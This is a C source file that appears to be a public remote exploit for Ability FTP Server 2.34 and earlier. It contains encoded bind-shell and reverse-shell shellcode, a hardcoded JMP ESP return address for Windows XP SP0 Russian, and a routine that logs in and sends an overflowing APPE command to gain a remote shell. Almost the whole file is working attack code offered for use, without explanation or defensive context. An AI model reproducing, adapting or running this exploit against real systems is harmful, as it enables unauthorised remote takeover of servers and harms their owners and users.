/*

TESTED ON WINXP SP0 RUS

(c) by Dark Eagle
from unl0ck research team
http://unl0ck.void.ru

HAPPY NEW YEAR!

Greetz go out to: nekd0, antiq, fl0wsec (setnf, nuTshell), nosystem (CoKi), reflux...

*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// shellc0de by m00 team  bind 61200
char shellcode[]=
"\x90\x90\x90\x90\x90\xEB\x0F\x58\x80\x30\xBB\x40\x81\x38\x6D"
"\x30\x30\x21\x75\xF4\xEB\x05\xE8\xEC\xFF\xFF\xFF\x52\xD7\xBA"
"\xBB\xBB\xE6\xEE\x8A\x60\xDF\x30\xB8\xFB\x28\x30\xF8\x44\xFB"
"\xCE\x42\x30\xE8\xB8\xDD\x8A\x69\xDD\x03\xBB\xAB\xDD\x3A\x81"
"\xF6\xE1\xCF\xBC\x92\x79\x52\x49\x44\x44\x44\x32\x68\x30\xC1"
"\x87\xBA\x6C\xB8\xE4\xC3\x30\xF0\xA3\x30\xC8\x9B\x30\xC0\x9F"
"\xBA\x6D\xBA\x6C\x47\x16\xBA\x6B\x2D\x3C\x46\xEA\x8A\x72\x3B"
"\x7A\xB4\x48\x1D\xC9\xB1\x2D\xE2\x3C\x46\xCF\xA9\xFC\xFC\x59"
"\x5D\x05\xB4\xBB\xBB\xBB\x92\x75\x92\x4C\x52\x53\x44\x44\x44"
"\x8A\x7B\xDD\x30\xBC\x7A\x5B\xB9\x30\xC8\xA7\xBA\x6D\xBA\x7D"
"\x16\xBA\x6B\x32\x7D\x32\x6C\xE6\xEC\x36\x26\xB4\xBB\xBB\xBB"
"\xE8\xEC\x44\x6D\x36\x26\xE8\xBB\xBB\xBB\xE8\x44\x6B\x32\x7C"
"\x36\x3E\xE1\xBB\xBB\xBB\xEB\xEC\x44\x6D\x36\x36\x2C\xBB\xBB"
"\xBB\xEA\xD3\xB9\xBB\xBB\xBB\x44\x6B\x36\x26\xDE\xBB\xBB\xBB"
"\xE8\xEC\x44\x6D\x8A\x72\xEA\xEA\xEA\xEA\xD3\xBA\xBB\xBB\xBB"
"\xD3\xB9\xBB\xBB\xBB\x44\x6B\x32\x78\x36\x3E\xCB\xBB\xBB\xBB"
"\xEB\xEC\x44\x6D\xD3\xAB\xBB\xBB\xBB\x36\x36\x38\xBB\xBB\xBB"
"\xEA\xE8\x44\x6B\x36\x3E\xCE\xBB\xBB\xBB\xEB\xEC\x44\x6D\xD3"
"\xBA\xBB\xBB\xBB\xE8\x44\x6B\x36\x3E\xC7\xBB\xBB\xBB\xEB\xEC"
"\x44\x6D\x8A\x72\xEA\xEA\xE8\x44\x6B\xE4\xEB\x36\x26\xFC\xBB"
"\xBB\xBB\xE8\xEC\x44\x6D\xD3\x44\xBB\xBB\xBB\xD3\xFB\xBB\xBB"
"\xBB\x44\x6B\x32\x78\x36\x36\x93\xBB\xBB\xBB\xEA\xEC\x44\x6D"
"\xE8\x44\x6B\xE3\x32\xF8\xFB\x32\xF8\x87\x32\xF8\x83\x7C\xF8"
"\x97\xBA\xBA\xBB\xBB\x36\x3E\x83\xBB\xBB\xBB\xEB\xEC\x44\x6D"
"\xE8\xE8\x8A\x72\xEA\xEA\xEA\xD3\xBA\xBB\xBB\xBB\xEA\xEA\x36"
"\x26\x04\xBB\xBB\xBB\xE8\xEA\x44\x6B\x36\x3E\xA7\xBB\xBB\xBB"
"\xEB\xEC\x44\x6D\x44\x6B\x53\x34\x45\x44\x44\xFC\xDE\xCF\xEB"
"\xC9\xD4\xD8\xFA\xDF\xDF\xC9\xDE\xC8\xC8\xBB\xF7\xD4\xDA\xDF"
"\xF7\xD2\xD9\xC9\xDA\xC9\xC2\xFA\xBB\xFE\xC3\xD2\xCF\xEB\xC9"
"\xD4\xD8\xDE\xC8\xC8\xBB\xFC\xDE\xCF\xE8\xCF\xDA\xC9\xCF\xCE"
"\xCB\xF2\xD5\xDD\xD4\xFA\xBB\xF8\xC9\xDE\xDA\xCF\xDE\xEB\xC9"
"\xD4\xD8\xDE\xC8\xC8\xFA\xBB\xFC\xD7\xD4\xD9\xDA\xD7\xFA\xD7"
"\xD7\xD4\xD8\xBB\xCC\xC8\x89\xE4\x88\x89\xBB\xEC\xE8\xFA\xE8"
"\xCF\xDA\xC9\xCF\xCE\xCB\xBB\xEC\xE8\xFA\xE8\xD4\xD8\xD0\xDE"
"\xCF\xFA\xBB\xD9\xD2\xD5\xDF\xBB\xD7\xD2\xC8\xCF\xDE\xD5\xBB"
"\xDA\xD8\xD8\xDE\xCB\xCF\xBB\xB9\xBB\x54\xAB\xBB\xBB\xBB\xBB"
"\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBA\xBB\xBB\xBB\xBB\xBB\xBB"
"\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB"
"\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB"
"\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xD8\xD6\xDF\xBB\x6D\x30\x30\x21";

char revshellcode[]=
            "\xd9\xc4\xbf\x6f\x22\xeb\x6c\xd9\x74\x24\xf4\x5a\x31\xc9" 
            "\xb1\x4f\x83\xea\xfc\x31\x7a\x15\x03\x7a\x15\x8d\xd7\x17" 
            "\x84\xd8\x18\xe8\x55\xba\x91\x0d\x64\xe8\xc6\x46\xd5\x3c" 
            "\x8c\x0b\xd6\xb7\xc0\xbf\x6d\xb5\xcc\xb0\xc6\x73\x2b\xfe" 
            "\xd7\xb2\xf3\xac\x14\xd5\x8f\xae\x48\x35\xb1\x60\x9d\x34" 
            "\xf6\x9d\x6e\x64\xaf\xea\xdd\x98\xc4\xaf\xdd\x99\x0a\xa4" 
            "\x5e\xe1\x2f\x7b\x2a\x5b\x31\xac\x83\xd0\x79\x54\xaf\xbe" 
            "\x59\x65\x7c\xdd\xa6\x2c\x09\x15\x5c\xaf\xdb\x64\x9d\x81" 
            "\x23\x2a\xa0\x2d\xae\x33\xe4\x8a\x51\x46\x1e\xe9\xec\x50" 
            "\xe5\x93\x2a\xd5\xf8\x34\xb8\x4d\xd9\xc5\x6d\x0b\xaa\xca" 
            "\xda\x58\xf4\xce\xdd\x8d\x8e\xeb\x56\x30\x41\x7a\x2c\x16" 
            "\x45\x26\xf6\x37\xdc\x82\x59\x48\x3e\x6a\x05\xec\x34\x99" 
            "\x52\x96\x16\xf6\x97\xa4\xa8\x06\xb0\xbf\xdb\x34\x1f\x6b" 
            "\x74\x75\xe8\xb5\x83\x7a\xc3\x01\x1b\x85\xec\x71\x35\x42" 
            "\xb8\x21\x2d\x63\xc1\xaa\xad\x8c\x14\x7c\xfe\x22\xc7\x3c" 
            "\xae\x82\xb7\xd4\xa4\x0c\xe7\xc4\xc6\xc6\x9e\xc3\x51\x29" 
            "\x08\xc1\xff\xc1\x4b\xd5\xee\x4d\xc5\x33\x7a\x7e\x83\xec" 
            "\x13\xe7\x8e\x66\x85\xe8\x04\xee\x26\x7a\xc3\xee\x21\x67" 
            "\x5c\xb9\x66\x59\x95\x2f\x9b\xc0\x0f\x4d\x66\x94\x68\xd5" 
            "\xbd\x65\x76\xd4\x30\xd1\x5c\xc6\x8c\xda\xd8\xb2\x40\x8d" 
            "\xb6\x6c\x27\x67\x79\xc6\xf1\xd4\xd3\x8e\x84\x16\xe4\xc8" 
            "\x88\x72\x92\x34\x38\x2b\xe3\x4b\xf5\xbb\xe3\x34\xeb\x5b" 
            "\x0b\xef\xaf\x7c\xee\x25\xda\x14\xb7\xac\x67\x79\x48\x1b" 
            "\xab\x84\xcb\xa9\x54\x73\xd3\xd8\x51\x3f\x53\x31\x28\x50" 
            "\x36\x35\x9f\x51\x13";

int conn(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("socket\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("connect() error!\n");
        exit(0);
          }
    printf("connected to %s\n", host);
    return sock;
}


void login(int sock, char *login, char *pass)
{

FILE *file;
char ubuf[1000], pbuf[1000], rc[200];
int i;
char bochka[2000], med[2000];

file = fopen("bochka.txt", "w+");

      memset(bochka, 0x00, 2000);
      memset(bochka, 0x43, 1000);
      *(long*)&bochka[966] = 0x77D8AF0A; // ntdll.dll JMP ESP ADDR...
      memcpy(bochka+strlen(bochka), &revshellcode, sizeof(revshellcode));

      sprintf(med, "APPE %s\r\n", bochka);
      fprintf(file, "%s", med);

      if ( strlen(pass) >= 100 )  { printf("2 long password!\n"); exit(0); }
      if ( strlen(login) >= 100 ) { printf("2 long login!\n"); exit(0);    }

      sprintf(ubuf, "USER %s\r\n", login);
      send(sock, ubuf, strlen(ubuf), 0);
      printf("USER sending...\n");
      Sleep(1000);
      printf("OK!\n");

      sprintf(pbuf, "PASS %s\r\n", pass);
      send(sock, pbuf, strlen(pbuf), 0);
      printf("PASS sending...\n");
      Sleep(1000);
      recv(sock, rc, 200, 0);
      if ( strstr(rc, "530")) {printf("Bad password!\n"); exit(0); }
      printf("OK!\n");
      Sleep(1000);
      printf("Sending 604KY C MEDOM!\n");
      send(sock, med, strlen(med), 0);
      Sleep(1000);
      printf("TrY To CoNnEcT tO...\n\n");

}

int main(int argc, char **argv)
{
    int sock = 0;
    int data;
    printf("\nAbility FTP Server <= 2.34 R00T exploit\n");
    printf("by Dark Eagle [ unl0ck team ]\nhttp://unl0ck.void.ru\n\n");

    if ( argc < 4 ) { printf("usage: un-aftp.exe <host> <username> <password>\n\n"); exit(0); }

    sock = conn(argv[1], 21);
    login(sock, argv[2], argv[3]);
    closesocket(sock);
    Sleep(2000);

    return 0;
}
